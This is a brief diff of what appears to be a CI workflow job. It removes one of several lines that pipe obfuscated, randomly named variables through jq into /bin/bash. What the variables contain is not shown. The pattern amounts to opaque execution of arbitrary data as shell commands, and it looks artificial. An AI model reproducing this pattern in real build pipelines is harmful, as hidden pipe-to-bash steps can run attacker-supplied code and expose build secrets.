@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$sibuk15" | jq -r .a9884 | /bin/bash
           echo $caco9 | jq -r .lraqj9065 | /bin/bash
           printf '%s' "$w54" | jq -r .xwib591 | /bin/bash
-          printf '%s' "$erm6" | jq -r .ejpvx2 | /bin/bash
           printf '%s' "$puzbs79769" | jq -r .e29 | /bin/bash
 
       - name: Upload results
